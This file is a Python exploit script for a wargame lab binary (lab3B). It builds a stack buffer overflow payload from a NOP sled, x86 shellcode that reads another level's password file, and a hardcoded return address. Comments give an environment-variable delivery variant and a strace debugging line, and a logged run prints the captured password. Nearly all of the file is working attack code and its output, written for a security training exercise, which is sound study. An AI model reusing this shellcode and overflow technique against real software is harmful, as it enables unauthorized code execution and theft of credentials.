# Author: Abhinav Thakur
# Email : compilepeace@gmail.com
#
# shellcode source: shellcode/read_flag.asm shellcode/read_flag.o


# Using environment variable to deliver shellcode :
# 
# printf "\x31\xc9\x51\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x8d\x5c\x24\x03\x89\xc8\x04\x05\xcd\x80\x89\xc3\x66\x81\xec\x01\x01\x89\xe1\x31\xd2\x66\xba\x01\x01\x31\xc0\xb0\x03\xcd\x80\x31\xdb\xb3\x02\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x89\xc3\xb3\x09\xb0\x01\xcd\x80" > shellcode
# export SHELLCODE=$(python -c 'print "\x90"*400')$(cat shellcode) 
# python -c 'print "A"*156 + "\x90\xf7\xff\xbf"' | /levels/lab03/lab3B
#
#
# While debugging, examine child process status :
# python -c 'print "A"*156 + "\x90\xf7\xff\xbf"' | strace -f /levels/lab03/lab3B



# Exploitation without environment variables
run_exploit = '''
    lab3B@warzone:/tmp/22$ python3 exploit.py | /levels/lab03/lab3B
    just give me some shellcode, k
    wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd

    p%|p*h1Qhpassh3A/.h/labhhomeh////\$̀f1f1��̀child is exiting...
'''

import sys

# Inside GDB, overflown buffer located @ 0xbffff660
rptr = b"\x80\xf6\xff\xbf"
shellcode = b"\x31\xc9\x51\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x8d\x5c\x24\x03\x89\xc8\x04\x05\xcd\x80\x89\xc3\x66\x81\xec\x01\x01\x89\xe1\x31\xd2\x66\xba\x01\x01\x31\xc0\xb0\x03\xcd\x80\x31\xdb\xb3\x02\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x89\xc3\xb3\x09\xb0\x01\xcd\x80"

# 156 bytes + return_pointer
payload = b"\x90"*(156-len(shellcode)) + shellcode + rptr
sys.stdout.buffer.write(payload)